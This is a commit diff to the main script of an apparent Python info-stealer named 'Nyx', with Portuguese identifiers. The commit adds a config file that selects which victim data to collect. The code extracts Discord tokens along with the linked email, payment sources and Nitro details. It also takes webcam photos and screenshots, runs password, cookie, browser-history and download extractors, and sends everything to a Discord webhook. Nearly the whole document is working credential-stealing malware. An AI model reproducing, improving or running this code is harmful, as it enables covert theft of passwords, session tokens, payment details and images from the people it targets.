bace43a0287306bbd67ee610b6ecf834d6b95a31
Guilherme Faccin <gfaccin27@gmail.com>
2023-09-21 12:00:00 -0300

    feat: add config validation to allow user selection of data to collect

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
 import subprocess
 import requests
 import os
+import json
 from plugins.systeminfo import obter_informacoes_sistema
 from plugins.discordtoken import TokenExtractor
 from plugins.webcam import capture_photo
@@ -22,6 +23,10 @@ appdata_local = os.getenv('LOCALAPPDATA')
 pasta_nyx = os.path.join(appdata_local, 'Nyx')
 if not os.path.exists(pasta_nyx):
     os.makedirs(pasta_nyx)
+
+def load_config():
+    with open('config.json', 'r') as f:
+        return json.load(f)
 
 executou_informacoes_sistema = False
 executou_discord_info = False
@@ -193,100 +198,107 @@ def criar_embed_com_imagens(caminho_foto1, caminho_foto2):
 
 if __name__ == "__main__":
     freeze_support()
+
+    cfg = load_config()
+
     try:
-        if not executou_informacoes_sistema:
-            informacoes_sistema = obter_informacoes_sistema()
-            executou_informacoes_sistema = True
-
-        if not executou_discord_info:
-            discord_info = TokenExtractor()
-            discord_info.extract_tokens()
-            executou_discord_info = True
-        
-        if not executou_webcam_foto:
-            webcam_foto = capture_photo()
-            executou_webcam_foto = True
-        
-        if not executou_screenshot:
-            screenshot = Sprint()
-            screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
-            webcam_path = os.path.join(pasta_nyx, 'webcam_foto.jpg')
-            save_image(screenshot, screenshot_path)
-            executou_screenshot = True
-
-        user_info_instance = UserInfos()
-        user_info = user_info_instance.get_user_info()
-        os_info = get_os_info()
-
-        user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
-
-        user_info_embed = {
+        if cfg.get("user_info", False):
+            user_info_instance = UserInfos()
+            user_info = user_info_instance.get_user_info()
+            user_info_message = '\n'.join(f"{key}: {value}" for key, value in user_info.items())
+            user_info_embed = {
             'title': 'Informações do Usuário',
             'description': f'```\n{user_info_message}\n```',
             'color': 0x0000FF
-        }
-        enviar_para_discord('', embed=user_info_embed)
+            }
+            enviar_para_discord('', embed=user_info_embed)
 
-        sistema_embed = {
+        if cfg.get("os_info", False):
+            os_info = get_os_info()
+            os_embed = {
+                'title': 'Informações do Sistema Operacional',
+                'description': f'```\n{os_info}\n```',
+                'color': 0xFF0000
+            }
+            enviar_para_discord('', embed=os_embed)    
+    
+        if not executou_informacoes_sistema and cfg.get("system_info", False):
+            informacoes_sistema = obter_informacoes_sistema()
+            executou_informacoes_sistema = True
+            sistema_embed = {
             'title': 'Informações do Sistema',
             'description': f'```\n{informacoes_sistema}\n```',
             'color': 0x00FF00
-        }
-        enviar_para_discord('', embed=sistema_embed)
+            }
+            enviar_para_discord('', embed=sistema_embed)
 
-        os_embed = {
-            'title': 'Informações do Sistema Operacional',
-            'description': f'```\n{os_info}\n```',
-            'color': 0xFF0000
-        }
-        enviar_para_discord('', embed=os_embed)
-
-        from datetime import datetime
-
-        for token in discord_info.tokens:
-            user_data = discord_info.get_user_data(token)
-            if user_data:
-                avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
-                
-                discord_embed = {
-                    'title': 'Informações do Discord',
-                    'description': f"Nome de usuário: {user_data['username']}\n"
-                                f"E-mail: {user_data.get('email', 'Não disponível')}\n"
-                                f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
-                                f"Token: `{token}`",
-                    'color': 0xFF0000,
-                    'thumbnail': {
-                        'url': avatar_url
+        if not executou_discord_info and cfg.get("discord_info", False) :
+            discord_info = TokenExtractor()
+            discord_info.extract_tokens()
+            executou_discord_info = True
+            for token in discord_info.tokens:
+                user_data = discord_info.get_user_data(token)
+                if user_data:
+                    avatar_url = f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"
+                    
+                    discord_embed = {
+                        'title': 'Informações do Discord',
+                        'description': f"Nome de usuário: {user_data['username']}\n"
+                                    f"E-mail: {user_data.get('email', 'Não disponível')}\n"
+                                    f"Nitro: {'Sim' if user_data.get('premium_type') else 'Não'}\n"
+                                    f"Token: `{token}`",
+                        'color': 0xFF0000,
+                        'thumbnail': {
+                            'url': avatar_url
+                        }
                     }
-                }
 
-                payment_sources = discord_info.get_payment_sources(token)
-                if payment_sources:
-                    discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
-                else:
-                    discord_embed['description'] += "\nNenhum cartão de crédito registrado"
+                    payment_sources = discord_info.get_payment_sources(token)
+                    if payment_sources:
+                        discord_embed['description'] += f"\nCartões de crédito: {len(payment_sources)}"
+                    else:
+                        discord_embed['description'] += "\nNenhum cartão de crédito registrado"
 
-                subscriptions = discord_info.get_nitro_subscription(token)
-                if subscriptions:
-                    for sub in subscriptions:
-                        renew_timestamp = sub.get("current_period_end")
-                        if renew_timestamp:
-                            expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
-                            discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
-                        else:
-                            discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"
+                    subscriptions = discord_info.get_nitro_subscription(token)
+                    if subscriptions:
+                        for sub in subscriptions:
+                            renew_timestamp = sub.get("current_period_end")
+                            if renew_timestamp:
+                                expiration_date = datetime.fromtimestamp(renew_timestamp / 1000).strftime('%Y-%m-%d %H:%M:%S')
+                                discord_embed['description'] += f"\nNitro expira em: {expiration_date}"
+                            else:
+                                discord_embed['description'] += "\nNitro ativo, mas sem data de expiração disponível"
 
-                enviar_para_discord('', embed=discord_embed)
+                    enviar_para_discord('', embed=discord_embed)
+        
 
-        enviar_imagem_para_discord(webcam_path)
 
-        if os.path.exists(screenshot_path):
-            enviar_imagem_para_discord(screenshot_path)
+        if not executou_webcam_foto and cfg.get("webcam_photo", False):
+            webcam_foto = capture_photo()
+            executou_webcam_foto = True
+            webcam_path = os.path.join(pasta_nyx, 'webcam_foto.jpg')
+            enviar_imagem_para_discord(webcam_path)
+        
+        if not executou_screenshot and cfg.get("screenshot", False):
+            screenshot = Sprint()
+            screenshot_path = os.path.join(pasta_nyx, 'prtscr.png')
+            save_image(screenshot, screenshot_path)
+            executou_screenshot = True
+            if os.path.exists(screenshot_path):
+                enviar_imagem_para_discord(screenshot_path)
 
-        executar_password_extractor()
-        executar_browser_downloads()
-        executar_browser_history()
-        executar_cookie_extractor()
+
+        if cfg.get("password", False):
+            executar_password_extractor()
+
+        if cfg.get("browser_downloads", False):
+            executar_browser_downloads()
+        
+        if cfg.get("browser_history", False):
+            executar_browser_history()
+
+        if cfg.get("cookies", False):
+            executar_cookie_extractor()
 
     except Exception as e:
         print(f"Ocorreu um erro durante a execução do script: {e}")
